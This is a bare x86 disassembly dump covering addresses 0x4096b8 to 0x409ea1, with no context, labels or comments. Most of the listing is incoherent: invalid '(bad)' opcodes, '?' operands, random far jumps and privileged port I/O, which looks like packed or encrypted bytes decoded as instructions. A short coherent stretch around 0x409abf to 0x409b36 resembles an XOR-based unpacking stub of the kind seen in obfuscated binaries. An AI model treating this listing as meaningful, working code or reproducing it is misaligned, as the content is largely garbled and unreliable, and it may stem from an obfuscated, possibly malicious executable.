  4096b8:	sub    eax,0x64cccd6a
  4096bd:	lds    edx,FWORD PTR [edx]
  4096bf:	adc    BYTE PTR [edi],bh
  4096c1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4096c2:	dec    eax
  4096c3:	cmc    
  4096c4:	inc    edi
  4096c5:	out    dx,eax
  4096c6:	scas   eax,DWORD PTR es:[edi]
  4096c7:	push   ds
  4096c8:	test   eax,0x77223a95
  4096cd:	mov    bh,0x4a
  4096cf:	scas   eax,DWORD PTR es:[edi]
  4096d0:	popf   
  4096d1:	cs and al,0x71
  4096d4:	mov    edi,0xc5f5dcdb
  4096d9:	fidiv  DWORD PTR [ebx]
  4096db:	inc    edx
  4096dc:	mov    al,0x58
  4096de:	fs jb  0x4096d6
  4096e1:	xchg   ebx,eax
  4096e2:	push   ebp
  4096e3:	push   ebx
  4096e4:	in     eax,dx
  4096e5:	jmp    0x409695
  4096e7:	cmp    edx,eax
  4096e9:	jge    0x409670
  4096eb:	inc    edx
  4096ec:	add    ebp,DWORD PTR [edx+0x5c]
  4096ef:	xchg   esp,eax
  4096f0:	sub    DWORD PTR [edi-0x1a26b986],0x46e8aa8e
  4096fa:	push   0x32d7977b
  4096ff:	mov    ds:0xeb4b31fb,eax
  409704:	xor    ebp,ebx
  409706:	pop    es
  409707:	pop    edi
  409708:	out    dx,eax
  409709:	or     eax,0x88453a7b
  40970e:	pop    ss
  40970f:	cmp    DWORD PTR [esi+0x70],edi
  409712:	pop    ecx
  409713:	xchg   ebp,eax
  409714:	adc    bh,BYTE PTR [ebx]
  409716:	ins    BYTE PTR es:[edi],dx
  409717:	mov    bl,0x76
  409719:	mov    edi,0x17cc9a1
  40971e:	fs jmp 0xd721:0xc44110bd
  409726:	jmp    0x4096f4
  409728:	mov    BYTE PTR [esi],dl
  40972a:	out    0x99,al
  40972c:	in     eax,dx
  40972d:	add    al,0x93
  40972f:	dec    eax
  409730:	cli    
  409731:	inc    ebp
  409732:	cwde   
  409733:	jbe    0x40976e
  409735:	clc    
  409736:	loope  0x409783
  409738:	aaa    
  409739:	es add ch,ch
  40973c:	in     al,dx
  40973d:	retf   0x25fe
  409740:	in     eax,dx
  409741:	add    al,0xf8
  409743:	mov    edi,DWORD PTR [edi]
  409745:	sar    eax,cl
  409747:	mov    al,BYTE PTR [ebx+0x8930ce7]
  40974d:	ss fdivr st,st(7)
  409750:	push   edx
  409751:	in     eax,0xa9
  409753:	mov    dh,0xa7
  409755:	aaa    
  409756:	push   esp
  409757:	mov    edi,0x57c84b87
  40975c:	xor    esp,0x16e3bd5c
  409762:	push   edx
  409763:	rcr    DWORD PTR [edx+0x6d],1
  409766:	loop   0x4097dd
  409768:	nop
  409769:	loope  0x4097aa
  40976b:	jle    0x409780
  40976d:	mov    cl,0x5a
  40976f:	cmp    dh,BYTE PTR [eax-0x30]
  409772:	sar    DWORD PTR [ebp+esi*1-0x763b046b],1
  409779:	add    BYTE PTR [edx-0x26c1e018],cl
  40977f:	leave  
  409780:	xchg   ebp,eax
  409781:	out    0x62,eax
  409783:	adc    DWORD PTR [ebx+0x43978bf5],edx
  409789:	or     edi,DWORD PTR [edx+edx*1+0x111f1161]
  409790:	or     DWORD PTR [eax+ecx*1+0x18],edx
  409794:	xor    ah,BYTE PTR [esi]
  409796:	jmp    0x40976a
  409798:	mov    ?,WORD PTR [eax+0x69]
  40979b:	cmp    dl,BYTE PTR [edx-0x3f]
  40979e:	inc    esi
  40979f:	(bad)  
  4097a0:	in     eax,0xdc
  4097a2:	lahf   
  4097a3:	mov    bh,0x6b
  4097a5:	xlat   BYTE PTR ds:[ebx]
  4097a6:	mov    al,0x3e
  4097a8:	dec    ebx
  4097a9:	cmc    
  4097aa:	xchg   si,ax
  4097ac:	push   ecx
  4097ad:	mov    WORD PTR [ebx+0x2a],fs
  4097b0:	sbb    ebp,DWORD PTR [edi]
  4097b2:	jmp    0xd841d5b9
  4097b7:	inc    ebp
  4097b8:	push   edx
  4097b9:	mov    ecx,0x99b085fa
  4097be:	mov    dl,0x93
  4097c0:	test   BYTE PTR [ecx],dh
  4097c2:	sbb    eax,0x79b45127
  4097c7:	std    
  4097c8:	aaa    
  4097c9:	add    ebx,DWORD PTR [ecx-0x54]
  4097cc:	push   0x8e80ab95
  4097d1:	bound  edx,QWORD PTR [ecx-0x441baf23]
  4097d7:	xor    DWORD PTR [edx-0x35],esi
  4097da:	inc    esi
  4097db:	sbb    eax,0xf0af8bee
  4097e0:	sub    BYTE PTR [esi+0x3e],dl
  4097e3:	xor    DWORD PTR [esi-0x75],0x6
  4097e7:	sti    
  4097e8:	mul    BYTE PTR [edx+0x2175ea4a]
  4097ee:	mov    WORD PTR [esi],?
  4097f0:	(bad)  
  4097f1:	clc    
  4097f2:	sahf   
  4097f3:	stos   DWORD PTR es:[edi],eax
  4097f4:	test   al,0x80
  4097f6:	xor    DWORD PTR [ecx],edx
  4097f8:	adc    DWORD PTR [ecx+ecx*2+0x1a6e3fa3],edi
  4097ff:	push   ds
  409800:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409801:	ins    BYTE PTR es:[edi],dx
  409802:	inc    eax
  409803:	jmp    0xf081:0x7309515d
  40980a:	xor    DWORD PTR [ebx+0x32cd7c90],esp
  409810:	ins    BYTE PTR es:[edi],dx
  409811:	shl    DWORD PTR [edi],cl
  409813:	xchg   DWORD PTR [edi+0x19],edi
  409816:	inc    esp
  409817:	inc    ecx
  409818:	aam    0x4c
  40981a:	retf   0xafa0
  40981d:	sub    al,0x58
  40981f:	addr16 push eax
  409821:	dec    esi
  409822:	jns    0x40981b
  409824:	ja     0x40982a
  409826:	inc    esi
  409827:	int    0x8f
  409829:	into   
  40982a:	rcl    BYTE PTR [ecx+0x5b9ad302],0x4d
  409831:	lea    ecx,[edi-0x3f899bc]
  409837:	into   
  409838:	mov    bl,0xaa
  40983a:	sub    ebp,DWORD PTR [eax]
  40983c:	mov    al,dl
  40983e:	dec    ebp
  40983f:	mov    ds:0x8471cc2f,al
  409844:	sbb    ebp,DWORD PTR [edx+0x5a9a2b0b]
  40984a:	add    al,0x32
  40984d:	push   ebx
  40984e:	sub    bh,bl
  409850:	cmc    
  409851:	jne    0x4097df
  409853:	add    BYTE PTR [eax+ecx*2-0x6e],0x61
  409858:	hlt    
  409859:	xchg   edx,eax
  40985a:	mov    al,ds:0xd091d0b8
  40985f:	bound  esp,QWORD PTR [ecx-0x2d]
  409862:	and    eax,0x327d2953
  409867:	mov    DWORD PTR [edx],0xaaec61e4
  40986d:	mov    ah,0xe8
  40986f:	shl    BYTE PTR [esi+0x5c7d13d9],0xe8
  409876:	cmp    esi,DWORD PTR [edx-0x7122d0b2]
  40987c:	iret   
  40987d:	cwde   
  40987e:	jae    0x409821
  409880:	jg     0x409861
  409882:	inc    edx
  409883:	int3   
  409884:	out    0x37,eax
  409886:	adc    al,BYTE PTR [ebp-0x3]
  409889:	ds jb  0x409874
  40988c:	inc    esp
  40988d:	stos   BYTE PTR es:[edi],al
  40988e:	test   DWORD PTR [ebx+0x682158d9],0xe7be8bac
  409898:	or     esp,DWORD PTR [ecx]
  40989a:	shr    BYTE PTR [ebp-0x7061827],cl
  4098a0:	pop    ss
  4098a1:	test   DWORD PTR fs:[edi+edx*2+0xd5d3f69],ebx
  4098a9:	clc    
  4098aa:	sub    dl,BYTE PTR [esi+0x5c]
  4098ad:	dec    esi
  4098ae:	loopne 0x4098b3
  4098b0:	ins    DWORD PTR es:[edi],dx
  4098b1:	not    esp
  4098b3:	sbb    ah,ah
  4098b5:	ins    BYTE PTR es:[edi],dx
  4098b6:	call   0x5750:0xd354863c
  4098bd:	lods   al,BYTE PTR ds:[esi]
  4098be:	mov    ds,WORD PTR [esp+eiz*2+0x1b]
  4098c2:	or     ecx,DWORD PTR [eax]
  4098c4:	and    eax,0x82f4ee54
  4098c9:	jns    0x409912
  4098cb:	xchg   ebx,eax
  4098cc:	mov    edi,0x49cb9d2a
  4098d1:	gs icebp 
  4098d3:	xor    ch,cl
  4098d5:	iret   
  4098d6:	nop
  4098d7:	jge    0x40985c
  4098d9:	sbb    ebp,DWORD PTR [edi+0x30]
  4098dc:	inc    ebx
  4098dd:	mov    al,ds:0xeb56fc31
  4098e2:	out    dx,eax
  4098e3:	xlat   BYTE PTR ds:[ebx]
  4098e4:	xchg   esp,eax
  4098e5:	jg     0x4098c5
  4098e7:	les    esp,FWORD PTR [eax-0x2c6b1047]
  4098ed:	jp     0x4098af
  4098ef:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4098f0:	call   0x9639:0x594c88c7
  4098f7:	fwait
  4098f8:	hlt    
  4098f9:	ss adc eax,0x3620abf7
  4098ff:	adc    ah,0x25
  409902:	jg     0x4098e7
  409904:	xchg   ebp,eax
  409905:	add    BYTE PTR [edx-0x1ce3c283],bl
  40990b:	fwait
  40990c:	inc    ebx
  40990d:	mov    al,ds:0xaf049f1d
  409912:	jmp    0xd593:0xfe9d839e
  409919:	jecxz  0x409945
  40991b:	cld    
  40991c:	sub    dh,BYTE PTR [edi-0x7ce575a7]
  409922:	call   0x2dfacd18
  409927:	pop    ss
  409928:	sub    eax,0x928dfbba
  40992d:	dec    eax
  40992e:	(bad)  
  40992f:	xchg   esi,eax
  409930:	(bad)  
  409931:	loope  0x409921
  409933:	ins    DWORD PTR es:[edi],dx
  409934:	(bad)  
  409935:	and    bl,cl
  409937:	je     0x409962
  409939:	jge    0x40999a
  40993b:	push   ds
  40993c:	jmp    0x4099a4
  40993e:	or     BYTE PTR [esp+eiz*2+0x5150d10],dl
  409945:	daa    
  409946:	outs   dx,BYTE PTR ds:[esi]
  409947:	mov    BYTE PTR [edx-0x23f758ad],dh
  40994d:	cli    
  40994e:	or     al,0x6d
  409950:	enter  0xf6f9,0x9e
  409954:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409955:	je     0x4099aa
  409957:	push   edi
  409958:	call   0xc4ee912
  40995d:	pop    ss
  40995e:	out    0x2b,al
  409960:	inc    ebx
  409961:	ret    0x7bad
  409964:	outs   dx,BYTE PTR fs:[esi]
  409966:	les    ebx,FWORD PTR [ebp-0x32]
  409969:	rol    ch,1
  40996b:	je     0x409920
  40996d:	test   cl,0x66
  409970:	loope  0x4099c0
  409972:	push   ds
  409973:	scas   eax,DWORD PTR es:[edi]
  409974:	inc    edi
  409975:	mov    ds:0x67878762,al
  40997a:	fild   WORD PTR [eax]
  40997c:	sahf   
  40997d:	icebp  
  40997e:	mov    ebp,0xdf1e001d
  409983:	mov    DWORD PTR ds:0xa3a1f182,0x9fada6b3
  40998d:	ss jg  0x40999a
  409990:	or     BYTE PTR [esi-0x7e],al
  409993:	dec    edi
  409994:	mov    bh,0x30
  409996:	dec    eax
  409997:	mov    BYTE PTR [esi-0x6ed3ceec],ch
  40999d:	inc    ebx
  40999e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40999f:	enter  0x398f,0xe7
  4099a3:	loop   0x409a17
  4099a5:	jo     0x4099df
  4099a7:	loop   0x4099ce
  4099a9:	sbb    dh,dl
  4099ab:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4099ac:	mov    ebp,0x6218d06b
  4099b1:	push   esi
  4099b2:	cmp    dl,ah
  4099b4:	hlt    
  4099b5:	neg    BYTE PTR [edx+0x1a]
  4099b8:	out    0x49,eax
  4099ba:	mov    edx,0x45898e8f
  4099bf:	in     eax,dx
  4099c0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4099c1:	shl    BYTE PTR [edi],cl
  4099c3:	daa    
  4099c4:	fnstcw WORD PTR [ebp-0x3b]
  4099c7:	cs jo  0x409a0b
  4099ca:	shr    DWORD PTR [ecx],0x63
  4099cd:	retf   0x3453
  4099d0:	sbb    ebp,esi
  4099d2:	pusha  
  4099d3:	add    BYTE PTR [ebx-0x1b],0xd0
  4099d7:	add    bh,BYTE PTR [esi]
  4099d9:	(bad)  
  4099da:	xor    BYTE PTR [eax-0x1c612bd0],bl
  4099e0:	es jmp 0x5266521e
  4099e6:	jbe    0x409a2c
  4099e8:	ret    0x6079
  4099eb:	inc    edx
  4099ec:	mov    WORD PTR [edx+0x7ea9ac28],fs
  4099f2:	pop    eax
  4099f3:	fild   QWORD PTR [eax+0x446fd5e5]
  4099f9:	cs add ecx,esp
  4099fc:	mov    fs,ebx
  4099fe:	xor    bh,BYTE PTR [ebx+0x6c]
  409a01:	mov    esi,0x2ef35410
  409a06:	loopne 0x4099dd
  409a08:	popa   
  409a09:	cmp    esi,DWORD PTR [edi]
  409a0b:	pop    ds
  409a0c:	inc    edi
  409a0d:	jnp    0x409a0e
  409a0f:	cmp    al,0x20
  409a11:	xchg   ecx,eax
  409a12:	popf   
  409a13:	inc    ebx
  409a14:	cwde   
  409a15:	mov    edx,0x352eb69
  409a1a:	add    eax,ebx
  409a1c:	inc    ebx
  409a1d:	fs sub esi,ebp
  409a20:	shl    BYTE PTR [ebx],cl
  409a22:	pop    eax
  409a23:	dec    ebp
  409a24:	hlt    
  409a25:	fwait
  409a26:	jg     0x4099b8
  409a28:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409a29:	add    eax,0x37f88f84
  409a2e:	dec    BYTE PTR [edi-0x6b]
  409a31:	xchg   ecx,eax
  409a32:	add    DWORD PTR [esi+0x28],edi
  409a35:	and    DWORD PTR [edi-0x27d00d37],esp
  409a3b:	stos   BYTE PTR es:[edi],al
  409a3c:	mov    esi,0xb25affad
  409a41:	push   ss
  409a42:	cmp    esi,eax
  409a44:	ss retf 
  409a46:	jnp    0x409a5d
  409a48:	(bad)  
  409a49:	pop    eax
  409a4a:	or     edi,DWORD PTR [eax+0xfd49c10]
  409a50:	jge    0x409a7f
  409a52:	xchg   edi,eax
  409a53:	es push esi
  409a55:	div    DWORD PTR [edx]
  409a57:	jge    0x409a7a
  409a59:	daa    
  409a5a:	sbb    BYTE PTR [ebx-0x4984cc27],cl
  409a60:	int3   
  409a61:	cwde   
  409a62:	xor    eax,DWORD PTR [ecx-0x78]
  409a65:	lahf   
  409a66:	int    0x30
  409a68:	out    0xeb,eax
  409a6a:	test   DWORD PTR [edi-0x2d],esp
  409a6d:	fld    QWORD PTR [ecx-0x3a]
  409a70:	pop    eax
  409a71:	dec    edx
  409a72:	mov    eax,0x92830c08
  409a77:	mov    ebx,0xadf8297d
  409a7c:	xchg   ecx,eax
  409a7d:	sub    ebp,DWORD PTR [edx-0x11fd5489]
  409a83:	stos   DWORD PTR es:[edi],eax
  409a84:	fndisi(8087 only) 
  409a86:	cmc    
  409a87:	in     eax,dx
  409a88:	icebp  
  409a89:	fstp   DWORD PTR [ebp+0x3670bfdb]
  409a8f:	imul   esp,DWORD PTR [eax],0x7f04c1ad
  409a95:	imul   eax,DWORD PTR [ebp-0x2657982f],0x58
  409a9c:	pop    esp
  409a9d:	pop    esp
  409a9e:	sbb    BYTE PTR [edi+0x47c34782],0x59
  409aa5:	in     al,dx
  409aa6:	repz inc ebx
  409aa8:	popa   
  409aa9:	pop    es
  409aaa:	pop    ebp
  409aab:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409aac:	cld    
  409aad:	inc    edx
  409aae:	into   
  409aaf:	(bad)  
  409ab1:	xor    ch,dl
  409ab3:	jl     0x409ab0
  409ab5:	lea    sp,[ebp+0x80d8b56]
  409abc:	and    BYTE PTR [edx+0x0],al
  409abf:	add    ecx,DWORD PTR ds:0x420e82
  409ac5:	mov    DWORD PTR ds:0x422008,ecx
  409acb:	mov    esi,0xf89c85b5
  409ad0:	mov    DWORD PTR [ebp-0xc],esi
  409ad3:	mov    edx,DWORD PTR ds:0x420f34
  409ad9:	mov    ecx,DWORD PTR ds:0x42301c
  409adf:	sub    ecx,edx
  409ae1:	sub    edx,DWORD PTR [edx+ecx*1]
  409ae4:	lea    eax,[ebp-0xc]
  409ae7:	or     ecx,edx
  409ae9:	mov    DWORD PTR [ebp-0x14],eax
  409aec:	mov    eax,DWORD PTR [ebp-0xc]
  409aef:	mov    edx,DWORD PTR [ebp-0x14]
  409af2:	sbb    DWORD PTR ds:0x420fa0,ebx
  409af8:	mov    ecx,0x7510896
  409afd:	xor    eax,ecx
  409aff:	add    eax,0x3272dd
  409b04:	mov    DWORD PTR [edx],eax
  409b06:	mov    edx,DWORD PTR ds:0x42201c
  409b0c:	sbb    DWORD PTR ds:0x420ef0,edx
  409b12:	mov    eax,ds:0x4242ad
  409b17:	mov    edx,DWORD PTR [ebp-0x4]
  409b1a:	sbb    DWORD PTR ds:0x420fac,0x420e82
  409b24:	mov    eax,DWORD PTR [eax]
  409b26:	or     DWORD PTR ds:0x420f08,0x422000
  409b30:	add    eax,DWORD PTR [edx]
  409b32:	push   edi
  409b33:	mov    DWORD PTR [ebp-0x8],eax
  409b36:	jmp    0x40beb0
  409b3b:	popa   
  409b3c:	dec    edi
  409b3d:	jmp    0x409b64
  409b3f:	mov    ebx,0xf1fba379
  409b44:	jnp    0x409bbc
  409b46:	js     0x409bb8
  409b48:	stos   BYTE PTR es:[edi],al
  409b49:	stos   BYTE PTR es:[edi],al
  409b4a:	js     0x409b85
  409b4c:	add    al,0x7a
  409b4e:	jp     0x409b69
  409b50:	pop    edi
  409b51:	jp     0x409bcd
  409b53:	popf   
  409b54:	addr16 (bad) 
  409b56:	outs   dx,DWORD PTR ds:[esi]
  409b57:	inc    ebx
  409b58:	test   al,0xd
  409b5a:	or     dl,BYTE PTR [edi-0x63313b19]
  409b60:	retf   0x1bf2
  409b63:	out    0x14,eax
  409b65:	add    BYTE PTR [edi],al
  409b67:	pop    ds
  409b68:	jp     0x409b1c
  409b6a:	mov    ebp,0xe9aa0549
  409b6f:	ss mov al,0x3c
  409b72:	jnp    0x409bc5
  409b74:	frstor [ebp+0x1c]
  409b77:	xor    al,0x3c
  409b79:	or     edi,DWORD PTR [edi-0x15012d2b]
  409b7f:	mov    esi,0xb6635c5b
  409b84:	pop    esp
  409b85:	jl     0x409bd9
  409b87:	pop    ds
  409b88:	das    
  409b89:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409b8a:	clc    
  409b8b:	jle    0x409b64
  409b8d:	lock test al,0x71
  409b90:	jne    0x409b31
  409b92:	pusha  
  409b93:	lahf   
  409b94:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409b95:	dec    esp
  409b96:	mov    esi,0xe19184d2
  409b9b:	inc    ebx
  409b9c:	jb     0x409bed
  409b9e:	pop    ebx
  409b9f:	(bad)  
  409ba0:	loop   0x409b99
  409ba2:	mov    al,ah
  409ba4:	jb     0x409baa
  409ba6:	loop   0x409c00
  409ba8:	mov    bl,0x8e
  409baa:	sub    al,0x15
  409bac:	icebp  
  409bad:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409bae:	in     al,0x15
  409bb0:	das    
  409bb1:	mov    ch,0x4c
  409bb3:	imul   eax,ebp,0xb68c0fb3
  409bb9:	jmp    0x5828:0xb2715cb4
  409bc0:	cmp    eax,0x9471b701
  409bc5:	mov    dh,0x40
  409bc7:	mov    cl,0xd0
  409bc9:	xchg   BYTE PTR [edx+0x53],dh
  409bcc:	loop   0x409c26
  409bce:	dec    esp
  409bcf:	mov    ecx,0xf0b8e58a
  409bd4:	jnp    0x409b77
  409bd6:	adc    dh,BYTE PTR [edi]
  409bd8:	lds    esi,FWORD PTR [ebp+0x614a7338]
  409bde:	es lahf 
  409be0:	nop
  409be1:	push   esi
  409be2:	loopne 0x409b76
  409be4:	lods   eax,DWORD PTR ds:[esi]
  409be5:	retf   0x1953
  409be8:	push   ebp
  409be9:	pop    eax
  409bea:	cmp    eax,0x41d34bc7
  409bef:	push   0x14f7e1e8
  409bf4:	scas   al,BYTE PTR es:[edi]
  409bf5:	adc    DWORD PTR [esi-0x7f],edi
  409bf8:	inc    ebp
  409bf9:	add    eax,0x3b511ad
  409bfe:	into   
  409bff:	imul   esp,DWORD PTR [ecx+0xc],0x72b668c3
  409c06:	aad    0x3a
  409c08:	cmp    ebp,DWORD PTR [eax-0x68]
  409c0b:	scas   al,BYTE PTR es:[edi]
  409c0c:	jne    0x409c80
  409c0e:	jl     0x409bd2
  409c10:	adc    esi,DWORD PTR [ecx+0x13]
  409c13:	inc    edx
  409c14:	mov    bl,0x22
  409c16:	jne    0x409c56
  409c18:	repz jb 0x409bdd
  409c1b:	cmp    BYTE PTR [edi],al
  409c1d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409c1e:	enter  0xc238,0xd1
  409c22:	xor    al,0xcb
  409c24:	scas   al,BYTE PTR es:[edi]
  409c25:	je     0x409c8c
  409c27:	adc    ah,BYTE PTR [ebx-0xd2acd0c]
  409c2d:	adc    DWORD PTR [eax+0x27],0x5f
  409c31:	xor    al,0x8a
  409c33:	xor    DWORD PTR [ebx+0x51],0x6a
  409c37:	jnp    0x409c35
  409c39:	adc    DWORD PTR [edx+edx*2],ebx
  409c3c:	stos   DWORD PTR es:[edi],eax
  409c3d:	xor    bh,al
  409c3f:	mov    BYTE PTR [edi+0x48adbd92],dl
  409c45:	and    dh,BYTE PTR [ecx+ebp*1+0x2c67a8f7]
  409c4c:	mov    esp,0xf2f916d0
  409c51:	dec    ebx
  409c52:	xor    eax,0xaa5b0706
  409c57:	mov    WORD PTR [ebx+0x3a],?
  409c5a:	jmp    0x409be1
  409c5c:	imul   BYTE PTR [eax-0x1c2727]
  409c62:	xchg   DWORD PTR [edx-0x615afdf7],edi
  409c68:	inc    edi
  409c69:	ret    0x2fc
  409c6c:	jge    0x409ca5
  409c6e:	pop    edx
  409c6f:	mov    edx,0xa0f38901
  409c74:	leave  
  409c75:	pop    edx
  409c76:	cmp    eax,0xf4206095
  409c7b:	or     DWORD PTR [edi],esp
  409c7d:	mov    edx,0x7cdf1472
  409c82:	les    edi,FWORD PTR [ecx]
  409c84:	imul   edx,edx,0x67
  409c87:	iret   
  409c88:	mov    al,0x8
  409c8a:	mov    ecx,0xd99f2b51
  409c8f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409c90:	in     eax,dx
  409c91:	sar    ecx,1
  409c93:	pop    ebp
  409c94:	push   edx
  409c95:	push   ebp
  409c96:	add    BYTE PTR [ecx-0x21d0bc7],0xa1
  409c9d:	mov    eax,ds:0xed9edafb
  409ca2:	in     al,0x88
  409ca4:	push   0x7e
  409ca6:	mov    ebx,0x66e0436a
  409cab:	sbb    esi,ebp
  409cad:	inc    ebp
  409cae:	pop    edi
  409caf:	inc    edi
  409cb0:	mov    ebp,0x937340f4
  409cb5:	or     esi,DWORD PTR [esi]
  409cb7:	mov    BYTE PTR [edi-0x3e],bh
  409cba:	push   eax
  409cbb:	fsub   DWORD PTR [edi+ebx*1-0x1a62e962]
  409cc2:	push   ds
  409cc3:	in     eax,0x6f
  409cc5:	cmp    eax,0xe65d178a
  409cca:	jmp    0x1410:0xe6db4783
  409cd1:	sbb    al,0x8b
  409cd3:	in     al,0x41
  409cd5:	mov    edi,0xd141d461
  409cda:	adc    edx,DWORD PTR [esp+esi*4+0x77]
  409cde:	adc    DWORD PTR [esi],ecx
  409ce0:	retf   0x4a08
  409ce3:	(bad)  
  409ce4:	(bad)  
  409ce5:	or     edx,esi
  409ce7:	mov    edi,edi
  409ce9:	inc    edi
  409cea:	lea    esi,[edx-0x55658913]
  409cf0:	stos   DWORD PTR es:[edi],eax
  409cf1:	sub    DWORD PTR [edi+ebx*4+0x1e],edx
  409cf5:	(bad)  
  409cf6:	gs inc edx
  409cf8:	loop   0x409d40
  409cfa:	xchg   ecx,eax
  409cfb:	cmp    eax,0x5d64f89d
  409d00:	sbb    BYTE PTR [eax],0x4f
  409d03:	in     al,dx
  409d04:	fdivr  st(6),st
  409d06:	xchg   ecx,eax
  409d07:	je     0x409ca1
  409d09:	inc    sp
  409d0b:	rcl    BYTE PTR [eax+0x40a8966],cl
  409d11:	xchg   ebx,eax
  409d12:	push   0xd9b066fb
  409d17:	cmp    DWORD PTR ds:0x3958f521,ebx
  409d1d:	dec    edi
  409d1e:	inc    esp
  409d1f:	outs   dx,BYTE PTR ds:[esi]
  409d20:	xchg   ebx,eax
  409d21:	sub    al,0x41
  409d23:	mov    esp,DWORD PTR [ecx+0x3c]
  409d26:	fldenv [ebx-0x3bb87da5]
  409d2c:	mov    al,0x3f
  409d2e:	mov    DWORD PTR [edi+0x45],eax
  409d31:	int    0x85
  409d33:	and    esi,DWORD PTR [ebx]
  409d35:	retf   
  409d36:	fs or  al,0x7e
  409d39:	sub    DWORD PTR [edx+0x6e],edx
  409d3c:	xor    ch,BYTE PTR [ebp+0x58]
  409d3f:	xchg   BYTE PTR [ebx],bh
  409d41:	out    dx,eax
  409d42:	inc    ebx
  409d43:	leave  
  409d44:	sub    cl,cl
  409d46:	fs adc al,0xb8
  409d49:	sbb    bh,BYTE PTR [ebp+0x3825be38]
  409d4f:	mov    ecx,0x22256b36
  409d54:	or     BYTE PTR [esi-0x121e3bc7],dl
  409d5a:	dec    edi
  409d5b:	push   cs
  409d5c:	or     eax,0xab34d97e
  409d61:	bound  ebx,QWORD PTR [esi-0x24da45de]
  409d67:	(bad)  [ecx+0x7747c519]
  409d6d:	test   BYTE PTR [edx],ch
  409d6f:	shr    edi,1
  409d71:	xor    al,0x54
  409d73:	out    0x53,al
  409d75:	mov    esi,0x47e6a252
  409d7a:	inc    esi
  409d7b:	mov    bh,0x65
  409d7d:	adc    BYTE PTR [edx+0x42eb13ca],bl
  409d83:	mov    ah,0x99
  409d85:	daa    
  409d86:	imul   ebp,DWORD PTR [edi-0x32c81ae2],0xffffffc6
  409d8d:	nop
  409d8e:	mov    al,0x0
  409d90:	fwait
  409d91:	in     al,0xc7
  409d93:	xchg   ebp,eax
  409d94:	ins    DWORD PTR es:[edi],dx
  409d95:	mov    ecx,0x6d6290b0
  409d9a:	xor    eax,esi
  409d9c:	cmp    eax,0x21162df4
  409da1:	xor    eax,0x3110a0dc
  409da6:	sahf   
  409da7:	push   edi
  409da8:	imul   esi,esi,0x72152592
  409dae:	pop    eax
  409daf:	pusha  
  409db0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409db1:	push   ecx
  409db2:	jl     0x409dd7
  409db4:	dec    ecx
  409db5:	test   DWORD PTR ds:0x1d368d72,esi
  409dbb:	fsubr  QWORD PTR [eax-0x6c]
  409dbe:	cdq    
  409dbf:	test   BYTE PTR ds:0x9c676581,bh
  409dc5:	xchg   ebp,eax
  409dc6:	inc    edx
  409dc7:	loopne 0x409dd5
  409dc9:	hlt    
  409dca:	mov    BYTE PTR [eax+edi*4+0x2f],dl
  409dce:	in     al,dx
  409dcf:	(bad)  
  409dd0:	inc    esi
  409dd1:	cmp    al,0x18
  409dd3:	mov    WORD PTR [ebx],?
  409dd5:	xlat   BYTE PTR ds:[ebx]
  409dd6:	fwait
  409dd7:	or     eax,0x6df3ea75
  409ddc:	mov    al,0x40
  409dde:	cwde   
  409ddf:	xchg   ebp,eax
  409de0:	(bad)  
  409de1:	sub    dh,BYTE PTR ds:0x8b4747f5
  409de7:	ror    DWORD PTR [edi+0x3a9bb7c3],1
  409ded:	push   eax
  409dee:	lods   al,BYTE PTR cs:[esi]
  409df0:	test   eax,0x13f37499
  409df5:	xchg   ebx,eax
  409df6:	and    DWORD PTR [edx-0x4dd10042],0xffffffa2
  409dfd:	jp     0x409e65
  409dff:	pop    ss
  409e00:	(bad)  
  409e01:	(bad)  
  409e02:	lock sar BYTE PTR [eax],1
  409e05:	outs   dx,DWORD PTR ds:[esi]
  409e06:	adc    eax,0x7c38cb5c
  409e0b:	clc    
  409e0c:	call   0x6c71:0x9f061651
  409e13:	cmp    eax,0xfb5f7c86
  409e18:	push   esi
  409e19:	neg    DWORD PTR [eax+0x11b6bfed]
  409e1f:	sub    ah,bl
  409e21:	fidiv  DWORD PTR [esi-0x66]
  409e24:	shl    DWORD PTR [esi],1
  409e26:	test   DWORD PTR [edi+0x744d2bd1],edi
  409e2c:	lahf   
  409e2d:	mov    gs,WORD PTR [ebp+0x37247cd6]
  409e33:	add    dh,BYTE PTR [edx]
  409e35:	stc    
  409e36:	push   eax
  409e37:	in     al,0x5c
  409e39:	or     BYTE PTR [eax],bh
  409e3b:	sbb    eax,0x22ce244f
  409e40:	and    DWORD PTR [ecx+0x6f],0x67b4bfab
  409e47:	shl    BYTE PTR [edi+0x36],0x6f
  409e4b:	cs in  eax,dx
  409e4d:	outs   dx,BYTE PTR ds:[esi]
  409e4e:	xchg   esp,eax
  409e4f:	mov    cl,0xd7
  409e51:	or     al,0x19
  409e53:	xor    esi,ebp
  409e55:	xor    BYTE PTR [eax+0x20],0xfc
  409e59:	shr    DWORD PTR [eax],cl
  409e5b:	fimul  WORD PTR [eax+0x28]
  409e5e:	and    BYTE PTR [edi-0x7a1645df],0x26
  409e65:	shl    BYTE PTR [ecx-0x5c],0x71
  409e69:	daa    
  409e6a:	test   BYTE PTR [edi-0x4d],0x83
  409e6e:	ror    BYTE PTR ss:[edx+eax*1-0x560047f],1
  409e76:	aad    0x71
  409e78:	mov    edi,0x9a6dbaff
  409e7d:	add    cl,BYTE PTR [edx+0xa]
  409e80:	bound  esp,QWORD PTR gs:[ebp+0xb]
  409e84:	js     0x409ef0
  409e86:	xor    al,0xd4
  409e88:	pop    edi
  409e89:	mov    esp,0x4e348f31
  409e8e:	enter  0x2095,0x6d
  409e92:	ret    
  409e93:	cld    
  409e94:	fcmovb st,st(1)
  409e96:	sub    edi,0xb3c80815
  409e9c:	jmp    0x409e40
  409e9e:	push   edx
  409e9f:	dec    ebp
  409ea0:	push   eax
  409ea1:	and    dl,BYTE PTR [esp+eax*8]
